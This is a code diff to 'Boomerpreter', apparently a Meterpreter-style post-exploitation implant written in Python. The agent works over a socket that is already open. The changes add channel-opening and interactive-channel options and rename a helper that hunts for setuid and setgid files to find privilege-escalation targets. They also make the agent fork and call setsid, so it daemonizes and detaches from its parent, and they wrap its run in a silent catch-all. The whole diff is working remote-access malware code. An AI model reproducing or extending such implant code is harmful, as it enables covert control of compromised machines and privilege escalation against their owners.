@@ -4,14 +4,18 @@ from platform import python_version
 import glob
 import stat
 import os
-from threading import Thread
+import sys
+
 
 
 class Boomerpreter:
     def __init__(self,s):
         self.socket = s
+        self.channel = None
         self.options = {
-        "suid_sgid": ["get_suid_sgid", True]
+        "suid_sgid": ["get_suid_sgid", True],
+        "channel": ["open_channel", False],
+        "interact": ["interact_channel", True]
         }
 
     def run(self):
@@ -41,7 +45,7 @@ class Boomerpreter:
         for f in os.listdir(my_dir):
             aux_file = os.path.join(my_dir, f)
             if os.path.isfile(aux_file):
-                result = self.is_suid_sgid(aux_file)
+                result = self._is_suid_sgid(aux_file)
                 if result[0]:
                     files_suid.append(result[0])
                 if result[1]:
@@ -52,7 +56,7 @@ class Boomerpreter:
         response = files
         return response
 
-    def is_suid_sgid(self, file_name):
+    def _is_suid_sgid(self, file_name):
         results = []
         try:
             f = os.stat(file_name)
@@ -69,10 +73,22 @@ class Boomerpreter:
             results.append(None)
         return results
 
-try: 
-    boomerpreter = Boomerpreter(s)
-    t = Thread(target=boomerpreter.run())
-    t.setDaemon = True
-    t.start()
+
+boomerpreter = Boomerpreter(s)
+
+if hasattr(os, 'fork'):
+    pid = os.fork()
+    if pid > 0:
+        print("Meterpreter is running!") #test purposes
+        sys.exit(0)
+
+    if pid == 0:  
+        if hasattr(os, 'setsid'):
+            try:
+                os.setsid()
+            except OSError:
+                pass
+try:
+    boomerpreter.run()
 except:
     pass
